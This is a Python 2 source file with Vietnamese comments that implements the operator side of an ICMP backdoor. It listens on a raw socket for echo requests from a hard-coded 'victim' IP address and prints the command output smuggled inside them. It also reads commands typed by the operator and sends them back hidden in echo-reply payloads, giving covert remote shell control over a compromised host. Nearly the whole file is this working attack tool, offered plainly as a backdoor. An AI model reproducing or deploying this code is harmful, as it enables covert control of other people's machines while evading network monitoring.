# -*- coding: utf-8 -*-

"""
Trong phần này mình sẽ build phần icmp server
--------------------------ICMP Replay-------------------------------------------------|
[type of message]  8 bit                                                       |
[code]             8 bit                                                       |
[check sum]        16 bit                                                      |
[indentifier BE LE]    2 byte                                                  |
[Sequence number BE LE]2 byte                                                  |
[time sent request]    8 byte                                                  |
[payload data] optional 32 byte <maximun là 578 byte>                          |
-------------------------------------------------------------------------------|

Vậy phía server sẽ gởi  gói icmp replay
Đối với
"""

import os, sys, socket, struct, select, time


ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLAY = 0


def setNonBlocking(fd):
    """
    Make a file descriptor non-blocking
    """

    import fcntl

    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)

def default_timer():
    return time.time()

def checksum(source_string):
    """
    tạo ra check sum cho icmp có độ dài 16 bit,
    Nói chung không cần quan tâm hàm này, nó mục đich để kiểm tra header và data,
    Không cần biết vì biết cũng cã làm gì, hihi
    """
    sum = 0
    countTo = (len(source_string) / 2) * 2
    count = 0
    while count < countTo:
        thisVal = ord(source_string[count + 1]) * 256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff
        count = count + 2

    if countTo < len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff

    answer = answer >> 8 | (answer << 8 & 0xff00)

    return answer

def receive_one_ping(my_socket, victim_ip):

    """
    nhận 1 ping từ socker
    """
    # my_socket.setblocking(0)
    # my_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Make standard input a non-blocking file
    stdin_fd = sys.stdin.fileno()
    setNonBlocking(stdin_fd)

    out = ""

    while True:

        cmd = ''

        # nhận gói echo request
        if my_socket in select.select([my_socket], [], [])[0]:
            buff_packet, addr = my_socket.recvfrom(4096)

            if 0 == len(buff_packet):
                my_socket.close()
                print "backdoor icmp chua bat"
                sys.exit(0)

            # check ping từ victim gởi

            if addr[0] == victim_ip:
                icmpHeader = buff_packet[20:28]
                type, code, checksum, identifier, sequence = struct.unpack(
                    "bbHHh", icmpHeader
                )

                if type == 8:
                    data = buff_packet[28:]

                     # in ra mang hinh
                    if len(data) > 0:
                        out = out + data

                    if len(data) == 0:
                        sys.stdout.write(out)
                        sys.stdout.flush()
                        out = ""

                    # doc tu ban phim
                    try:
                        cmd = sys.stdin.readline()
                    except:
                        pass

                    if cmd == 'exit\n':
                        return

                    send_replay_ping(my_socket, victim_ip, identifier, sequence, cmd)

def send_replay_ping(my_socket, dest_addr, identifier, sequence, cmd):
    """
    gởi gói ping replay dựa trên gói request
    :param my_socket: 
    :param dest_addr: 
    :param identifier: 
    :param sequence: 
    :param cmd: 
    :return: 
    """

    dest_addr = socket.gethostbyname(dest_addr)

    # Header is type (8 bit), code (8 bit), checksum (16 bit), identifier (16 bit), sequence (16 bit)

    my_checksum = 0

    # Make a dummy heder with a 0 checksum.
    header = struct.pack("bbHHh", ICMP_ECHO_REPLAY, 0, my_checksum, identifier, 1)

    data = struct.pack("d", default_timer()) + cmd

    # Calculate the checksum on the data and the dummy header.
    my_checksum = checksum(header + data)

    # Now that we have the right checksum, we put that in. It's just easier
    # to make up a new header than to stuff it into the dummy.
    header = struct.pack(
        "bbHHh", ICMP_ECHO_REPLAY, 0, my_checksum, identifier, sequence
    )
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1))  # Don't know about the 1

if __name__ == '__main__':


    try:
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error, (errno, msg):
        if errno == 1:
            # permit denny
            msg = msg + (
                " - Note that ICMP messages can only be sent from processes"
                " running as root."
            )
            raise socket.error(msg)
        raise  # raise the original error


    # nhập gói request
    try:
        receive_one_ping(my_socket,"192.168.6.204")
    except KeyboardInterrupt:
        print "exit"
        my_socket.close()
        sys.exit(1)
